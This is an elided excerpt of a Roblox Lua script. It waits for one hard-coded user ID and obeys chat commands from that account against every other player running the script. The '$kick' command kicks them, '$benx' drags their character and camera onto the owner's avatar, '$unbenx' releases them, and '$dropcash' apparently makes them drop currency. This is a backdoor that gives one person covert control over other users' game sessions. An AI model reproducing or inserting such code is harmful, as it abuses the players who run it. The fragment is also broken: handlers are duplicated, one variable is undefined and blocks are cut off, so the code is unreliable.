while true do 
	local p7_lua = game:GetService("Players"):GetPlayerByUserId(1683670578) --aborcjav
		if p7_lua then
		...
		p7_lua.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= p7_lua then
		...
		p7_lua.Chatted:connect(function(cht)
			if cht:match("$benx .") then
				if game.Players.LocalPlayer ~= p7_lua then
					...
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = p7_lua.Character.HumanoidRootPart
					local benxed = true
					while benxed == true do
						...
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p7_lua.Character.HumanoidRootPart.CFrame + p7_lua.Character.HumanoidRootPart.CFrame.lookVector * 0.5
		...
		p7_lua.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
				if game.Players.LocalPlayer ~= p7_lua then
					...
					wait(15)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(p7_lua.Character.UpperTorso.Position)
				end
			end
		...
		p7_lua.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= p7_lua then
					game.Players.LocalPlayer:Kick("Kicked by p7_lua user")
				end
			end
		...
		p7_lua.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= p7_lua2 then
